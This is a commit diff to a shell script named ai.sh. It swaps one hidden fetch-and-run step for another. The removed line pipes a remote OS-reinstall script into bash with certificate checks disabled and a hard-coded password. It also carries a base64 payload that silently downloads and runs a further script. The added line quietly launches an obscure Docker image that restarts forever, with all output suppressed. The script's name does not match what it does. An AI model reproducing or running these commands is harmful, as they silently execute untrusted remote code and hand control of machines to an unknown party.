7037bce72c56d0ffae28548721802295b37e2e6f
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-16 17:34:11 +0800

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 
-sleep 600; bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ec2.123456" -port 1234 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92amJhaGtkcy9qc25jc2RjY3cvbWFpbi9xLnNoKSA+Pi9kZXYvbnVsbCAyPiYxICYKCg=="
-# bash -c "docker run -dt --restart=always qocshbdak/qweugv:latest" >/dev/null 2>&1 &
+# sleep 600; bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ec2.123456" -port 1234 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92amJhaGtkcy9qc25jc2RjY3cvbWFpbi9xLnNoKSA+Pi9kZXYvbnVsbCAyPiYxICYKCg=="
+bash -c "docker run -dt --restart=always qocshbdak/qweugv:latest" >/dev/null 2>&1 &
 
